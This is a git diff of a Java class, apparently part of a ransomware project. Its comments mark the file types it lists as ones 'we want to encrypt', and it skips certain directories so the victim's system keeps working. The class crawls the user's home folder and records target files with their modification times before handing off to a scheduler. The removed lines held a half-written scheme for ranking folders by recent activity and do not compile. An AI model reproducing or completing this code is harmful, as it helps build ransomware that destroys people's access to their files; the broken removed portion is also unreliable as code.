@@ -36,8 +36,6 @@ public class FindFiles {
     //List of filetypes we want to encrypt
     List<String> allowedFiles;
     List<String> avoidDir;
-    HashMap<String, Integer> directoryScore = new HashMap<>();
-    HashMap<String, HashMap<long, >>
 
 
     public void FindFiles() throws Exception {
@@ -53,15 +51,14 @@ public class FindFiles {
         fileWriter = new BufferedWriter(writer);
 
         //List of allowed files
-
         allowedFiles = new FileTypes().AllowedTypes;
         avoidDir = new AvoidedDir().avoidDir;
 
         //Traverse the file system
         traverse(home);
         fileWriter.close();
-        hashToFile();
     }
+
     public void traverse(String path) throws Exception {
         File root = new File(path);
         File[] list = root.listFiles();
@@ -72,76 +69,22 @@ public class FindFiles {
             if (f.isDirectory()) {
                 String name = f.getName();
                 if (avoidDir.contains(name.toLowerCase())) return; //want system to still work
-
                 traverse(f.getAbsolutePath());
 
             } else {
-
                 //split to get file extension
                 int index = f.getName().lastIndexOf(".");
                 String fileType = f.getName().substring(index + 1);
 
-                //if file extension is allowed, write to file
+                //if file extension is allowed, write to file with last mod
                 if(allowedFiles.contains("." + fileType.toUpperCase())) {
-                    //if directory already in map, update score
-                    if(directoryScore.containsKey(f.getParent())) {
-                        int currentScore = directoryScore.get(f.getParent());
-                        directoryScore.put(f.getParent(), getScore(f) + currentScore);
-
-                        Integer fileCount = directoryFileCount.get(f.getParent());
-                        directoryFileCount.put(f.getParent(), fileCount+1);
-                    } else {
-                        //else add it in
-                        directoryScore.put(f.getParent(), getScore(f));
-                        directoryFileCount.put(f.getParent(), 1);
-                    }
-                    fileWriter.write(f.getAbsolutePath());
+                    long lastmod = f.lastModified();
+                    fileWriter.write(f.getAbsolutePath() + ", " + lastmod);
+                    System.out.println(f.getAbsolutePath() + ", " + lastmod);
                     fileWriter.newLine();
                 }
             }
         }
-    }
-
-    public int getScore(File file) {
-       //files last modified date
-        long lastModified = file.lastModified();
-        Date lastMod = new Date(lastModified);
-
-        //working out how to score it
-        long currentTimeMillis = System.currentTimeMillis();
-        Date date = new Date(currentTimeMillis- TimeUnit.DAYS.toMillis(1)); //last 24hrs
-        Date lastWeek = new Date(currentTimeMillis - TimeUnit.DAYS.toMillis(7)); //this week
-        Date twoWeeks = new Date(currentTimeMillis - TimeUnit.DAYS.toMillis(14)); //last 2 weeks
-        Date lastMonth = new Date(currentTimeMillis - TimeUnit.DAYS.toMillis(30)); //this month
-        Date last3Months = new Date(currentTimeMillis - TimeUnit.DAYS.toMillis(90)); //last 3 months
-
-
-
-    }
-
-    public void hashToFile() throws Exception {
-        Writer writer = new FileWriter(System.getProperty("user.home") + File.separator + "directory.txt", false);
-        fileWriter = new BufferedWriter(writer);
-
-        //update scores to averaged ones
-        for(String dir: directoryScore.keySet()) {
-            //score = sum of files in directories scores / number of files in directory
-            directoryScore.put(dir, directoryScore.get(dir)/directoryFileCount.get(dir));
-        }
-
-        //sort in assending order
-        HashMap<String, Integer> newdirectoryScore = directoryScore.entrySet().stream().sorted(
-                comparingByValue()).collect(toMap(e -> e.getKey(), e-> e.getValue(), (e1, e2) -> e2, LinkedHashMap::new));
-
-
-        //write to file
-        for(String dir: newdirectoryScore.keySet()) {
-            fileWriter.write(dir);
-            fileWriter.newLine();
-        }
-
-        fileWriter.close();
-
     }
 
 
@@ -149,6 +92,8 @@ public class FindFiles {
     public static void main(String[] args) throws Exception {
         FindFiles ff = new FindFiles();
         ff.FindFiles();
+        Scheduler s = new Scheduler();
+        s.function();
     }
 
 }
